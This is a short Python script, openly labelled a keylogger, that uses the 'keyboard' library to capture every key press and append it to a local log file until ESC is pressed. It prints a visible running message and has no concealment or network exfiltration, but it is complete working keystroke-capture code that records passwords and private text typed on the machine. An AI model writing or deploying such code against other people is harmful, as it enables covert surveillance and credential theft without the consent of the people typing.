import keyboard  # pip install keyboard

log_file = "keylog1.txt"

print("Keylogger is running... (Press ESC to stop)")

# Always start from a new paragraph when script runs again
with open(log_file, "a", encoding="utf-8") as f:
    f.write("\n\n--- New Session ---\n\n")  # Separator for each run

    while True:
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN:
            key = event.name

            if key == "esc":  # Stop on ESC key
                break
            elif key == "enter":  # New paragraph for Enter key
                f.write("\n\n")
            elif key == "space":  # Space between words
                f.write(" ")
            elif len(key) == 1:  # Normal characters
                f.write(key)
            else:  # Special keys like shift, ctrl
                f.write(f"[{key}] ")
